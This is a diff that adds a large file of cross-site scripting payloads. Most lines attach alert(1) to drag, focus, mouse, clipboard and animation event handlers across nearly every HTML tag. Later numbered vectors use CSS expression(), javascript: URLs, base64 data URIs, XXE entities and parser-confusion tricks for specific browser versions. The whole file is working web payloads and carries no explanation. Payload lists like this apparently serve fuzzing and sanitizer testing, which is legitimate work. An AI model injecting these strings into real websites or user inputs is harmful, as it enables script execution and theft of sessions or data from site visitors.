@@ -1,0 +1,363 @@
+<div draggable="true" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>
+<div draggable="true" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>
+<div draggable="true" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>
+<div draggable="true" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>
+<div draggable="true" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>
+<div draggable="true" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>
+<div draggable="true" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>
+<div draggable="true" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>
+<div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>
+<div draggable="true" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>
+<div draggable="true" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>
+<div draggable="true" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>
+<div draggable="true" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>
+<div draggable="true" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>
+<div draggable="true" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>
+<div draggable="true" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>
+<div draggable="true" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>
+<div draggable="true" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>
+<div draggable="true" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>
+<div draggable="true" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>
+<div draggable="true" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>
+<div draggable="true" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>
+<div draggable="true" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>
+<div draggable="true" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>
+<div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>
+<div draggable="true" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>
+<div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>
+<div draggable="true" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>
+<div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>
+<div draggable="true" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>
+<div draggable="true" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
+<div draggable="true" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>
+<div draggable="true" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>
+<div draggable="true" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>
+<div draggable="true" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>
+<div draggable="true" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>
+<div draggable="true" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
+<div draggable="true" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>
+<div draggable="true" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
+<div draggable="true" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>
+<div draggable="true" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>
+<div draggable="true" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>
+<div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>
+<div draggable="true" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>
+<div draggable="true" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>
+<div draggable="true" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>
+<div draggable="true" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>
+<div draggable="true" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>
+<div draggable="true" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>
+<div draggable="true" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>
+<div draggable="true" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>
+<div draggable="true" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>
+<div draggable="true" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
+<div draggable="true" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>
+<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>
+<div draggable="true" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>
+<div draggable="true" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>
+<div draggable="true" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>
+<div draggable="true" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
+<div draggable="true" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>
+<div draggable="true" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
+<div draggable="true" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>
+<div draggable="true" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>
+<div draggable="true" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>
+<div draggable="true" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>
+<div draggable="true" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>
+<div draggable="true" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
+<div draggable="true" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>
+<div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
+<div draggable="true" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>
+<div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
+<div draggable="true" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>
+<div draggable="true" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
+<div draggable="true" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>
+<div draggable="true" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
+<div draggable="true" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>
+<div draggable="true" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>
+<div draggable="true" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>
+<div draggable="true" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>
+<div draggable="true" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>
+<div draggable="true" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>
+<div draggable="true" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>
+<div draggable="true" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>
+<div draggable="true" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>
+<div draggable="true" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>
+<div draggable="true" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>
+<div draggable="true" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>
+<div draggable="true" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>
+<div draggable="true" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>
+<div draggable="true" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>
+<div draggable="true" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>
+<div draggable="true" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>
+<div draggable="true" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>
+<div draggable="true" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>
+<div draggable="true" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>
+<div draggable="true" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>
+<div draggable="true" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>
+<div draggable="true" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>
+<div draggable="true" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>
+<div draggable="true" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>
+<div draggable="true" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>
+<div draggable="true" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>
+<div draggable="true" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>
+<div draggable="true" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>
+<div draggable="true" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>
+<div draggable="true" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>
+<div draggable="true" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>
+<div draggable="true" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>
+<div draggable="true" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>
+<div draggable="true" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>
+<div draggable="true" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>
+<div draggable="true" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>
+<div draggable="true" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>
+<div draggable="true" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>
+<div draggable="true" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>
+<div draggable="true" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>
+<div draggable="true" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>
+<div draggable="true" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>
+<div draggable="true" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>
+<div draggable="true" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>
+<div draggable="true" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>
+<div draggable="true" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>
+<div draggable="true" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>
+<div draggable="true" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>
+<div draggable="true" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>
+<div draggable="true" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>
+<div draggable="true" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>
+<div draggable="true" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>
+<div draggable="true" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>
+<div draggable="true" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>
+<div draggable="true" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>
+<div draggable="true" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>
+<div draggable="true" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>
+<div draggable="true" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>
+<div draggable="true" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>
+<div draggable="true" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>
+<div draggable="true" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>
+<div draggable="true" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>
+<div draggable="true" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>
+<div draggable="true" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>
+<div draggable="true" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>
+<div draggable="true" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>
+<div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>
+<div draggable="true" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>
+<div draggable="true" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>
+<div draggable="true" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>
+<div draggable="true" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>
+<div draggable="true" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>
+<div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>
+<div draggable="true" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>
+<div draggable="true" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>
+<div draggable="true" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>
+<div draggable="true" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>
+<div draggable="true" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>
+<div draggable="true" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>
+<div draggable="true" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>
+<div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
+<div draggable="true" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>
+<div draggable="true" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>
+<div draggable="true" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>
+<div draggable="true" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>
+<div draggable="true" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>
+<div draggable="true" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>
+<div draggable="true" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>
+<div draggable="true" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>
+<div draggable="true" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>
+<div draggable="true" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>
+<div draggable="true" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>
+<div draggable="true" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>
+<div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>
+<div draggable="true" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>
+<div draggable="true" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>
+<div draggable="true" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>
+<div draggable="true" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>
+<div draggable="true" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>
+<div draggable="true" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>
+<div draggable="true" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>
+<div draggable="true" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>
+<div draggable="true" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>
+<div draggable="true" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>
+<div draggable="true" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>
+<div draggable="true" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>
+<div draggable="true" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>
+<div draggable="true" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>
+<div draggable="true" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>
+<div draggable="true" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>
+<div draggable="true" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>
+<div draggable="true" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>
+<div draggable="true" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>
+<div draggable="true" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>
+<div draggable="true" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>
+<div draggable="true" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>
+<div draggable="true" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>
+<div draggable="true" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>
+<div draggable="true" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>
+<div draggable="true" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>
+<div draggable="true" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>
+<div draggable="true" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>
+<div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>
+<div draggable="true" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>
+<div draggable="true" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>
+<div draggable="true" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>
+<div draggable="true" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>
+<div draggable="true" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>
+<div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>
+<div draggable="true" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>
+<div draggable="true" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>
+<div draggable="true" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>
+<div draggable="true" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>
+<div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
+<div draggable="true" ondrag="alert(1)">test</div>
+<div draggable="true" ondragend="alert(1)">test</div>
+<div draggable="true" ondragenter="alert(1)">test</div>
+<div draggable="true" ondragleave="alert(1)">test</div>
+<div draggable="true" ondragstart="alert(1)">test</div>
+<div id=x tabindex=1 onactivate=alert(1)></div>
+<div id=x tabindex=1 onbeforeactivate=alert(1)></div>
+<div id=x tabindex=1 onbeforedeactivate=alert(1)></div><input autofocus>
+<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>
+<div id=x tabindex=1 onfocus=alert(1)></div>
+<div id=x tabindex=1 onfocusin=alert(1)></div>
+<div onbeforecopy="alert(1)" contenteditable>test</div>
+<div onbeforecut="alert(1)" contenteditable>test</div>
+<div onbeforepaste="alert(1)" contenteditable>test</div>
+<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>
+<div onclick="alert(1)">test</div>
+<div oncontextmenu="alert(1)">test</div>
+<div oncopy="alert(1)" contenteditable>test</div>
+<div oncut="alert(1)" contenteditable>test</div>
+<div ondblclick="alert(1)">test</div>
+<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>
+<div onkeydown="alert(1)" contenteditable>test</div>
+<div onkeypress="alert(1)" contenteditable>test</div>
+<div onkeyup="alert(1)" contenteditable>test</div>
+<div onmousedown="alert(1)">test</div>
+<div onmouseenter="alert(1)">test</div>
+<div onmouseleave="alert(1)">test</div>
+<div onmousemove="alert(1)">test</div>
+<div onmouseout="alert(1)">test</div>
+<div onmouseover="alert(1)">test</div>
+<div onmouseup="alert(1)">test</div>
+<div onpaste="alert(1)" contenteditable>test</div>
+<style>:target {color: red;}</style><div id=x style="transition:color 10s" ontransitioncancel=alert(1)></div>
+<style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionend=alert(1)></div>
+<style>:target {transform: rotate(180deg);}</style><div id=x style="transition:transform 2s" ontransitionrun=alert(1)></div>
+<style>@keyframes slidein {}</style><div style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></div>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style="position:absolute;" onanimationcancel="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<svg><div onload=alert(1)></div>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
+<div id="41"><li style=list-style:url() onerror=alert(41)></li>
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
+<div id="43"><?xml version="1.0" standalone="no"?>
+</html>//["'`-->]]>]</div>
+<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
+<div id="53"><xml id="xss" src="test.htc"></xml>
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>
+<div id="62"><!-- IE 6-8 -->
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
+<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
+<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
+<div id="66"><?xml version="1.0"?>
+<root/>//["'`-->]]>]</div>
+<div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
+<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">   <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x></doc>//["'`-->]]>]</div>
+<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
+<div id="87"><svg xmlns="http://www.w3.org/2000/svg">
+</svg>//["'`-->]]>]</div>
+<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+</svg>//["'`-->]]>]</div>
+<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
+</svg>//["'`-->]]>]</div>
+<div id="90"><!-- Up to Opera 10.63 -->
+<div style=content:url(test2.svg)></div>
+<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
+<div id="91">[A]
+<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
+<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
+<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
+</svg>//["'`-->]]>]</div>
+<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+</svg>//["'`-->]]>]</div>
+<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
+<div id="97"><!-- IE 5-9 -->
+<div id=d><x xmlns="><iframe onload=alert(97)"></div>
+<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+<div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
+<div id="99">XXX<style>
+</style>//["'`-->]]>]</div>
+<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
+</svg>//["'`-->]]>]</div>
+<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+<div id="108"><!-- IE 5-8 standards mode -->
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
+<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
+</svg>//["'`-->]]>]</div>
+<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
+</svg>//["'`-->]]>]</div>
+<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+<div id="113"><div id="x">XXX</div>
+<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div>
+<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
+<div id="115"><!--[if]><script>alert(115)</script -->
+<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
+<div id="116"><div id="x">x</div>
+<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>
+<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div>
+<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
+<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
+<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
